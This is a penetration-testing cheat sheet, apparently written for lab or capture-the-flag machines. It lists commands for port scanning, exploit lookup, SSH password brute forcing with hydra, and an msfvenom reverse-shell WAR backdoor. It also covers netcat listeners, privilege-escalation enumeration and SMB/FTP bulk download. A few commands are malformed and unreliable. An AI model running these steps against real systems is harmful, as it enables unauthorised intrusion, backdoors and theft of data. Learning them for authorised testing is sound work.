# Starting Penetration

```
msfconsole
```

To Open metasploit console

## Port Scan

```
nmap -sV -sC -O -p- --min-rate 20000 IP
```

Alternate

```
nmap -T4 -A -v IP
```

-O - OS Detection

-p- - to scan all ports

20k rate probably way too high. Reduce to reduce risk of alerting firewall.

-sS - for TCP SYN Scan

-sV - to show services related to each port


### Get Version of Service

NetCat

```
nc IP PORT
```

Listen on port
```
nc IP PORT -lvnp
```

Listen throuh metsploit
```
use exploit/multi/handler
```

### Find Exploits with SearchSploit

```
searchsploit servicename version
```

### Add new modules to metasploit from exploit-db

Get path from searchsploit

```
curl http://www.exploit-db.com/download/ID  /root/.msf4/modules/exploits/custom/CUSTOMFILENAME
```



### Metadata

```
exiftool file
```

### Web Server:

```
python3 -m http.server PORT
```

Retrieve:
```
wget http://IP:PORT/PATH
```

#### Directory Discovery

Word lists are at `/usr/share/wordlists` (In KALI)

```
gobuster dir -u URL:port -t threads -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Backup: (Can get through things ^^^ can't)

```
dirb http://IP/
```
-X .sh - extensions to search
-w /path/to/wordlist - wordlist


#### Replicate website on local storage

```
wget http://ip/ -r
```
https:
```
wget http://ip/ -r --no-check-certificate

#### Wordpress vulnerability checker

```
wpscan --url URL
```

--plugin-detection aggressive    -   Takes a long time, but digs up good dirt


## SSH

### SSH with RSA file

```
ssh -i /path/to/file user@IP
```


#### Brute Forcing Passwords

```
hydra -l USER -P /path/to/wordlist ssh://IP
```

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials


## Apache

### After /manager breach

#### Make Offensive WAR file

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
```


## Attempt to Elevate permissions after entry

### Download file to remote host

Host:
```
nc -l PORT < /path/to/file
```

Client:
```
nc IP PORT > file
```

### Open SSH through Metasploit

```
use auxiliary/scanner/ssh/ssh_login
```

### Upgrade shell to meterpreter

```
use post/multi/manage/shell_to_meterpreter
```

##### Gather random exploits possibilities.

```
use post/multi/recon/local_exploit_suggester
```
Gives readout of possible vulnerabilities of connected host


### NFS (RPCBIND?)

Enumerate NFS shares.

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.223.98
```



### Linux Specific

```sudo -l```

```whoami```

##### Run command as specific user
```
sudo -u USER command
```

##### Start shell as specific user
```
sudo -u USER bash -i
```

#### Search specific word

```grep -n "WORD" /path/to/file(s)```
-n lists line number
-r - recursively check all files matching path
-B # - Prints this many lines before
-A # - Prints this many lines after

#### LinPEAS

https://github.com/carlospolop/PEASS-ng/releases

Only need linpeas.sh

```
scp /home/mike/linpeas.sh USER@IP:/home/USER
```
```
./linpeas.sh
```

#### Search for SUID Bit files

SUID Bit - User executes the file with permissions of the file owner

```
find / -perm -u=s -type f 2>/dev/null
```


### FTP

Replicate entire FTP
```
wget -m ftp://anonymous:anonymous@IP
```


### Samba share

##### Quick Enumeration

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP
```

Change port to match nmap results. (Usually 139 or 445)

##### Deep Enumeration

```
enum4linux -a IP | tee enum4linux.log
```


#### Inspect Samba Share

```
smbclient //ip/sambashare
```


#### Recursively download the SMB share

```
smbget -R smb://ip/sambashare
```

